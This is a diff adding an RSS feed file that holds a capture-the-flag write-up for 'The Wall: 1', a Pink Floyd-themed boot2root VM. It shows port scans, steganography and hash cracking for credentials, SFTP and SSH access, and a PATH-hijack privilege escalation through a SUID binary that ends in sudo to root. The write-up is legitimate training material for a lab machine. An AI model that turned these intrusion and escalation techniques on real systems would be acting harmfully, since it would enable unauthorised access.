@@ -1,0 +1,832 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>The wall on Cheesy Rumbles</title>
+    <link>http://rastamouse.me/categories/the-wall/</link>
+    <description>Recent content in The wall on Cheesy Rumbles</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 27 Nov 2015 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/categories/the-wall/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>The Wall: 1</title>
+      <link>http://rastamouse.me/writeups/2015/the-wall/</link>
+      <pubDate>Fri, 27 Nov 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/the-wall/</guid>
+      <description>
+
+&lt;p&gt;In 1965, one of the most influential bands of our times was formed.. Pink Floyd. This boot2root box has been created to celebrate 50 years of Pink Floyd&amp;rsquo;s contribution to the music industry, with each challenge giving the attacker an introduction to each member of the Floyd.&lt;/p&gt;
+
+&lt;p&gt;You challenge is simple&amp;hellip; set your controls for the heart of the sun, get root, and grab the flag! Rock on!&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://twitter.com/xerubus&#34;&gt;Xerubus&lt;/a&gt; asked if I would like to beta-test this VM prior to release and being a bit of a (closet) Pink Floyd fan, I jumped at the opportunity.  So obviously the first stage in any boot2root is to port scan the sucker.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ nmap -n -sT 192.168.56.104
+
+Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-12-02 19:52 GMT
+Stats: 0:01:25 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Nmap scan report for 192.168.56.104
+Host is up.
+All 1000 scanned ports on 192.168.56.104 are filtered
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Straight up trolled already.  I fired up Wireshark and after a minute or so, I saw a boat load of ARPs coming from The Wall - looking like an ARP scan.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/thewall-1/arps.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;If dug past the ARPs, and found a TCP packet destined for my IP on port 1337.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/thewall-1/1337.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;It looks like this is running on a cron, so I setup a netcat listener to catch the connection.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [192.168.56.103] from (UNKNOWN) [192.168.56.104] 21840
+
+                       .u!&amp;quot;`
+                   .x*&amp;quot;`
+               ..+&amp;quot;NP
+            .z&amp;quot;&amp;quot;   ?
+          M#`      9     ,     ,
+                   9 M  d! ,8P&#39;
+                   R X.:x&#39; R&#39;  ,
+                   F F&#39; M  R.d&#39;
+                   d P  @  E`  ,
+      ss           P  &#39;  P  N.d&#39;
+       x         &#39;&#39;        &#39;
+       X               x             .
+       9     .f       !         .    $b
+       4;    $k      /         dH    $f
+       &#39;X   ;$$     z  .       MR   :$
+        R   M$$,   :  d9b      M&#39;   tM
+        M:  #&#39;$L  ;&#39; M `8      X    MR
+        `$;t&#39; $F  # X ,oR      t    Q;
+         $$@  R$ H :RP&#39; $b     X    @&#39;
+         9$E  @Bd&#39; $&#39;   ?X     ;    W
+         `M&#39;  `$M d$    `E    ;.o* :R   ..
+          `    &#39;  &amp;quot;&#39;     &#39;    @&#39;   &#39;$o*&amp;quot;&#39;   
+   
+              The Wall by @xerubus
+          -= Welcome to the Machine =-
+
+If you should go skating on the thin ice of modern life, dragging behind you the silent reproach of a million tear-stained eyes, don&#39;t be surprised when a crack in the ice appears under your feet. - Pink Floyd, The Thin Ice
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ok&amp;hellip; brilliant, now what?&lt;/p&gt;
+
+&lt;p&gt;Well if you port scan the VM for a second time, it appears to have opened up a port.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ nmap -n -sT 192.168.56.104
+
+PORT   STATE SERVICE
+80/tcp open  http
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There is nothing to see on the page, with the exception of this image.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/thewall-1/floyd.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;In the HTML source, there is also the following:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;If you want to find out what&#39;s behind these cold eyes, you&#39;ll just have to claw your way through this disguise. - Pink Floyd, The Wall
+
+Did you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward for solving the 
+riddle, and further claimed that there was an enigma hidden within the artwork.
+
+737465673d3333313135373330646262623337306663626539373230666536333265633035
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That string is totally hex, which we can decode like so:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; string = &#39;737465673d3333313135373330646262623337306663626539373230666536333265633035&#39;
+&amp;gt;&amp;gt;&amp;gt; string.decode(&#39;hex&#39;)
+&#39;steg=33115730dbbb370fcbe9720fe632ec05&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;steg&lt;/code&gt; is a pretty solid clue, and probably relates to the image on the web page.  This other string is MD5 and can be pretty easily cracked - turns out to be &lt;code&gt;divisionbell&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;So let&amp;rsquo;s download &lt;code&gt;pink_floyd.jpg&lt;/code&gt; and run it through some steg tools.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~/Downloads$ steghide extract -sf pink_floyd.jpg 
+Enter passphrase: 
+wrote extracted data to &amp;quot;pink_floyd_syd.txt&amp;quot;.
+
+rasta@mouse:~/Downloads$ cat pink_floyd_syd.txt 
+Hey Syd,
+
+I hear you&#39;re full of dust and guitars? 
+
+If you want to See Emily Play, just use this key: U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0
+
+Roger
+
+Did you know? In 1965, The Pink Floyd Sound changed their name to Pink Floyd.  The name was inspired
+by Pink Anderson and Floyd Council, two blues muscians on the Piedmont Blues record Syd Barret had in 
+his collection.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So we have a new base64 and MD5 string.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~/Downloads$ echo -en &#39;U3lkQmFycmV0dA==&#39; | base64 -d
+SydBarrett
+
+f831605ae34c2399d1e5bb3a4ab245d0 == pinkfloydrocks
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So we have what looks like a set of credentials.  &lt;code&gt;SydBarrett:pinkfloydrocks&lt;/code&gt;.  But where to use them?&lt;/p&gt;
+
+&lt;h2 id=&#34;sydbarrett:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;SydBarrett&lt;/h2&gt;
+
+&lt;p&gt;I was stuck here for a while, but if we do a &amp;lsquo;wider&amp;rsquo; port scan, we find that port 1965 is open.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ nmap -n -sT -p- 192.168.56.104
+
+
+PORT     STATE SERVICE
+80/tcp   open  http
+1965/tcp open  unknown
+
+rasta@mouse:~$ nc 192.168.56.104 1965
+SSH-2.0-OpenSSH_7.0
+
+Protocol mismatch.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;SSH - so maybe we can SSH in as Syd.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ ssh SydBarrett@192.168.56.104 -p 1965
+
+SydBarrett@192.168.56.104&#39;s password: 
+Could not chdir to home directory /home/SydBarrett: No such file or directory
+This service allows sftp connections only.
+Connection to 192.168.56.104 closed.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ok, SFTP it is.  Let&amp;rsquo;s connect and see if we can find any interesting files.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ sftp -P 1965 SydBarrett@192.168.56.104
+SydBarrett@192.168.56.104&#39;s password: 
+Connected to 192.168.56.104.
+
+sftp&amp;gt; ls -la
+drwxr-xr-x    3 0        1000          512 Oct 24 18:17 .mail
+-rw-r--r--    1 0        1000         1912 Oct 25 22:56 bio.txt
+-rw-r--r--    1 0        1000       868967 Oct 24 16:17 syd_barrett_profile_pic.jpg
+
+sftp&amp;gt; ls -la .mail/
+drwxr-xr-x    2 0        1000          512 Nov 11 10:25 .stash
+-rw-r--r--    1 0        1000          309 Oct 24 18:18 sent-items
+
+sftp&amp;gt; ls -la .mail/.stash/
+-rw-r--r--    1 0        1000     48884479 Aug  7 14:33 eclipsed_by_the_moon
+
+sftp&amp;gt; get .mail/sent-items 
+Fetching /.mail/sent-items to sent-items
+   
+sftp&amp;gt; get .mail/.stash/eclipsed_by_the_moon 
+Fetching /.mail/.stash/eclipsed_by_the_moon to eclipsed_by_the_moon
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ cat sent-items 
+Date: Sun, 24 Oct 1965 18:45:21 +0200
+From: Syd Barrett &amp;lt;syd@pink.floyd&amp;gt;
+Reply-To: Syd Barret &amp;lt;syd@pink.floyd&amp;gt;
+To: Roger Waters &amp;lt;roger@pink.floyd&amp;gt;
+Subject: Had to hide the stash
+
+Roger... I had to hide the stash. 
+
+Usual deal.. just use the scalpel when you find it.
+
+Ok, sorry for that.
+
+Rock on man
+
+&amp;quot;Syd&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;scalpel&lt;/code&gt; is a clue here.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ file eclipsed_by_the_moon 
+eclipsed_by_the_moon: gzip compressed data, last modified: Wed Nov 11 00:15:47 2015, from Unix
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After we extract the content, we find it&amp;rsquo;s actually a disk image.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ file eclipsed_by_the_moon.lsd 
+eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID &amp;quot;MSDOS5.0&amp;quot;, sectors/cluster 2, reserved sectors 8, root entries 512, Media descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors 2048, sectors 96256 (volumes &amp;gt; 32 MB) , serial number 0x9e322180, unlabeled, FAT (16 bit)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It won&amp;rsquo;t boot, so we go back to our scalpel clue.  &lt;a href=&#34;https://github.com/sleuthkit/scalpel&#34;&gt;Scalpel&lt;/a&gt; is a tool for recovering deleted files - so lets see if we can recover anything.  The first stage is to mod &lt;code&gt;/etc/scalpel/scalpel.conf&lt;/code&gt; and uncomment all the different types of files you want to look for.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ scalpel eclipsed_by_the_moon.lsd 
+jpg with header &amp;quot;\xff\xd8\xff\xe0\x00\x10&amp;quot; and footer &amp;quot;\xff\xd9&amp;quot; --&amp;gt; 1 files
+Scalpel is done, files carved = 1, elapsed = 0 seconds.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A new directory is created, &lt;code&gt;scalpel-output&lt;/code&gt;, within which is a recovered image.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/thewall-1/roger.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;h2 id=&#34;rogerwaters:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;RogerWaters&lt;/h2&gt;
+
+&lt;p&gt;So now we have the password for RogerWaters, &lt;code&gt;hello_is_there_anybody_in_there&lt;/code&gt;. Let&amp;rsquo;s try and connect via SSH this time.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ ssh RogerWaters@192.168.56.104 -p 1965
+RogerWaters@192.168.56.104&#39;s password: 
+OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015
+
+                       .u!&amp;quot;`
+                   .x*&amp;quot;`
+               ..+&amp;quot;NP
+            .z&amp;quot;&amp;quot;   ?
+          M#`      9     ,     ,
+                   9 M  d! ,8P&#39;
+                   R X.:x&#39; R&#39;  ,
+                   F F&#39; M  R.d&#39;
+                   d P  @  E`  ,
+      ss           P  &#39;  P  N.d&#39;
+       x         &#39;&#39;        &#39;
+       X               x             .
+       9     .f       !         .    $b
+       4;    $k      /         dH    $f
+       &#39;X   ;$$     z  .       MR   :$
+        R   M$$,   :  d9b      M&#39;   tM
+        M:  #&#39;$L  ;&#39; M `8      X    MR
+        `$;t&#39; $F  # X ,oR      t    Q;
+         $$@  R$ H :RP&#39; $b     X    @&#39;
+         9$E  @Bd&#39; $&#39;   ?X     ;    W
+         `M&#39;  `$M d$    `E    ;.o* :R   ..
+          `    &#39;  &amp;quot;&#39;     &#39;    @&#39;   &#39;$o*&amp;quot;&#39;   
+$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;w00t shell.&lt;/p&gt;
+
+&lt;h2 id=&#34;nick-mason:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;Nick Mason&lt;/h2&gt;
+
+&lt;p&gt;After some standard Linux enumeration, we get a list of all users on the system.  It&amp;rsquo;s logical to assume that we will have to progress through each user before reaching root.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;SydBarrett:*:1000:1000:Syd Barrett:/home/SydBarrett:/sbin/nologin
+NickMason:*:1001:1001:Nick Mason:/home/NickMason:/bin/ksh
+RogerWaters:*:1002:1002:Roger Waters:/home/RogerWaters:/bin/ksh
+RichardWright:*:1003:1003:Richard Wright:/home/RichardWright:/bin/ksh
+DavidGilmour:*:1004:1004:David Gilmour:/home/DavidGilmour:/bin/ksh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we have a look for SUID and/or SGID files, we find two interesting binaries.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ find / -perm -4000 -print 2&amp;gt; /dev/null                 
+/usr/local/bin/brick
+/usr/local/bin/shineon
+
+$ ls -l /usr/local/bin/brick                                                                                                                                 
+-rws--s--x  1 NickMason  NickMason  7291 Aug  8 00:33 /usr/local/bin/brick
+$ ls -l /usr/local/bin/shineon                                                                                                                               
+-rwsr-s---  1 DavidGilmour  RichardWright  7524 Oct 25 07:58 /usr/local/bin/shineon
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We don&amp;rsquo;t have the privileges to execute &lt;code&gt;shineon&lt;/code&gt; yet, so let&amp;rsquo;s look at &lt;code&gt;brick&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ /usr/local/bin/brick                                                                                                                                       
+
+What have we here, laddie?
+Mysterious scribbings?
+A secret code?
+Oh, poems, no less!
+Poems everybody!
+
+Who is the only band member to be featured on every Pink Floyd album? : Nick Mason
+/bin/sh: Cannot determine current working directory
+
+$ id
+uid=1001(NickMason) gid=1001(NickMason) groups=1002(RogerWaters)
+$ whoami
+NickMason
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;richard-wright:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;Richard Wright&lt;/h2&gt;
+
+&lt;p&gt;In each home directory thus far, there has been a profile picture of the band member.  Although Nick&amp;rsquo;s is something else in disguise.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ file nick_mason_profile_pic.jpg                                                                                                                            
+nick_mason_profile_pic.jpg: Ogg data, Vorbis audio, stereo, 44100 Hz, created by: Xiph.Org libVorbis I
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Listening to the track, you will notice some morse code.  You can obviously decode it by ear, or load the spectrograph and do it visually.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/thewall-1/morse.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;The string we eventually come out with is &lt;code&gt;richardwright1943farfisa&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ su RichardWright 
+Password:
+ksh: Cannot determine current working directory
+$ id
+uid=1003(RichardWright) gid=1003(RichardWright) groups=1003(RichardWright)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;david-gilmour:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;David Gilmour&lt;/h2&gt;
+
+&lt;p&gt;Now we are Richard Wright, we can go back to the &lt;code&gt;shineon&lt;/code&gt; binary we found previously.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ /usr/local/bin/shineon                                                                                                                                     
+Menu
+
+1. Calendar
+2. Who
+3. Check Internet
+4. Check Mail
+5. Exit
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Trying out these functions, we can see that they are executing pre-defined shell commands.  If we run &lt;code&gt;strings&lt;/code&gt;, we can see that all but one is called with an absolute path.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ strings /usr/local/bin/shineon                                                                                                                             
+
+Menu
+1. Calendar
+2. Who
+3. Check Internet
+4. Check Mail
+5. Exit
+Quitting program!
+Invalid choice!
+load_menu
+Time - The Dark Side of the Moon
+/usr/bin/cal
+Press ENTER to continue.
+Echoes - Meddle
+/usr/bin/who
+Is There Anybody Out There? - The Wall
+/sbin/ping -c 3 www.google.com
+Keep Talking- The Division Bell
+mail
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;mail&lt;/code&gt; will be vulnerable to a PATH hijack.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cp /bin/ksh /tmp/mail                                                                                                                                      
+$ export PATH=/tmp:$PATH
+$ /usr/local/bin/shineon                                                                                                                                     
+Menu
+
+1. Calendar
+2. Who
+3. Check Internet
+4. Check Mail
+5. Exit
+4
+Keep Talking- The Division Bell
+mail: Cannot determine current working directory
+$ id
+uid=1003(RichardWright) euid=1004(DavidGilmour) gid=1003(RichardWright) groups=1003(RichardWright)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In his home directory is a file called &lt;code&gt;anotherbrick.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cat anotherbrick.txt                                                                                                                                       
+# Come on you raver, you seer of visions, come on you painter, you piper, you prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond
+
+New website for review:    pinkfloyd1965newblogsite50yearscelebration-temp/index.php
+
+# You have to be trusted by the people you lie to. So that when they turn their backs on you, you&#39;ll get the chance to put the knife in. - Pink Floyd, Dogs 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we head over to this new directory, we get the following page:&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/thewall-1/temp-index.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;As before, there is a clue in the HTML source.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Through the window in the wall, come streaming in on sunlight wings, a million bright ambassadors of morning. - Pink Floyd, Echoes
+Can you see what the Dog sees? Perhaps hints of lightness streaming in on sunlight wings?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Download &lt;code&gt;homepageimg.jpg&lt;/code&gt; and have a close look around where the dog is sitting.  You can just make out some black text.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/thewall-1/dog.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;To get a better look at this, I simply messed around with the brightness and contrast levels.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/thewall-1/dog-light.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;We can&amp;rsquo;t navigate to &lt;code&gt;\welcometothemachine&lt;/code&gt; in a browser.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;403 Forbidden
+OpenBSD httpd
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we have a look on the actual VM.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -l /var/www/                                                                                                                                            
+
+drwxr-x---  4 www   welcometothemachine  512 Nov 27 01:47 htdocs
+
+$ ls -l /var/www/htdocs/                                                                                                                                     
+ls: /var/www/htdocs/: Permission denied
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Even though we are part of the correct group our current privileges don&amp;rsquo;t reflect that, and on BSD apparently you can&amp;rsquo;t just run &lt;code&gt;newgrp&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cat /etc/group 
+welcometothemachine:*:1005:DavidGilmour
+
+$ id             
+uid=1003(RichardWright) euid=1004(DavidGilmour) gid=1003(RichardWright) groups=1003(RichardWright)
+
+$ newgrp welcometothemachine
+mail: newgrp: not found
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So we have to find another way of inheriting DavidGilmour&amp;rsquo;s group privs.  We can do just that with his password, that we find hidden in &lt;code&gt;david_gilmour_profile_pic.jpg&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ strings david_gilmour_profile_pic.jpg                                                                                                                      
+who_are_you_and_who_am_i
+
+$ su DavidGilmour
+Password:
+$ id
+uid=1004(DavidGilmour) gid=1004(DavidGilmour) groups=1004(DavidGilmour), 1(daemon), 67(www), 1005(welcometothemachine)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we can get in the directory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -l /var/www/htdocs/welcometothemachine/                                                                                                                 
+total 16
+-rws--s---  1 root  welcometothemachine  7513 Nov 27 01:47 PinkFloyd
+
+$ ./PinkFloyd                                                                                                                                                
+Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
+Answer:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we recall the other string in &lt;code&gt;homepageimg.jpg&lt;/code&gt;:  &lt;code&gt;50696e6b466c6f796435305965617273&lt;/code&gt;.  This is more hex which we can decode.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;gt;&amp;gt;&amp;gt; string = &#39;50696e6b466c6f796435305965617273&#39;
+&amp;gt;&amp;gt;&amp;gt; string.decode(&#39;hex&#39;)
+&#39;PinkFloyd50Years&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Maybe this is the correct answer?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ./PinkFloyd  
+Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
+Answer: PinkFloyd50Years
+
+Denied....
+If I had my way, I&#39;d have all of ya shot. - Pink Floyd, In The Flesh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nope, ok&amp;hellip;  After a while, I just shoved the raw hex in.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ./PinkFloyd  
+Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
+Answer: 50696e6b466c6f796435305965617273
+
+Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless
+
+Congratulations... permission has been granted.
+You can now set your controls to the heart of the sun!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;root:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;root&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;permission granted&lt;/code&gt; is a little cryptic.  It took me a while to realise it had given DavidGilmour sudo rights.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ sudo -l
+Password: 
+Matching Defaults entries for DavidGilmour on thewall:
+    env_keep+=&amp;quot;FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK&amp;quot;
+
+User DavidGilmour may run the following commands on thewall:
+    (ALL) SETENV: ALL
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So now we can just elevate, no problem.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ sudo -i
+# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Grab the flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# cat /root/flag.txt                                                                                                                                         
+
+&amp;quot;The band is fantastic, that is really what I think. Oh, by the way, which one is Pink? - Pink Floyd, Have A Cigar&amp;quot;
+
+                   Congratulations on rooting thewall!
+
+   ___________________________________________________________________
+  | |       |       |       |       |       |       |       |       | |
+  |_|_______|_______|______ &#39;__  ___|_______|_______|_______|_______|_|
+  |     |       |       |   |  )      /         |       |       |     |
+  |_____|_______|_______|__ |,&#39; , .  | | _ , ___|_______|_______|_____|
+  | |       |       |      ,|   | |\ | | ,&#39; |       |       |       | |
+  |_|_______|_______|____ &#39; | _ | | \| |&#39;\ _|_______|_______|_______|_|
+  |     |       |       |   \  _&#39; &#39;  ` |  \     |       |       |     |
+  |_____|_______|_______|_  ,-&#39;_ _____ | _______|_______|_______|_____|
+  | |       |       |   ,-&#39;|  _     |       |       |       |       | |
+  |_|_______|_______|__  ,-|-&#39; |  ,-. \ /_.--. _____|_______|_______|_|
+  |     |       |          |   |  | |  V  |   ) |       |       |     |
+  |_____|_______|_______|_ | _ |-&#39;`-&#39;  |  | ,&#39; _|_______|_______|_____|
+  | |       |       |      |        |  &#39;  ;&#39;        |       |       | |
+  |_|_______|_______|______&amp;quot;|_____  _,- o&#39;__|_______|_______|_______|_|
+  |     |       |       |       _,-&#39;    .       |       |       |     |
+  |_____|_______|_______|_ _,--&#39;\      _,-&#39;_____|_______|_______|_____|
+  | |       |       |     &#39;     ||_||-&#39; _   |       |       |       | |
+  |_|_______|_______|_______|__ || ||,-&#39;  __|_______|_______|_______|_|
+  |     |       |       |       |  ||_,-&#39;       |       |       |     |
+  |_____|_______|______.|_______.__  ___|_______|_______|_______|_____|
+  | |       |       |   \    |     /        |       |       |       | |
+  |_|_______|_______|___ \ __|___ /,  _ |   | ______|_______|_______|_|
+  |     |       |       | \      // \   |   |   |       |       |     |
+  |_____|_______|_______|_ \ /\ //--&#39;\  |   | __|_______|_______|_____|
+  | |       |       |       &#39;  V/    |  |-&#39; |__,    |       |       | |
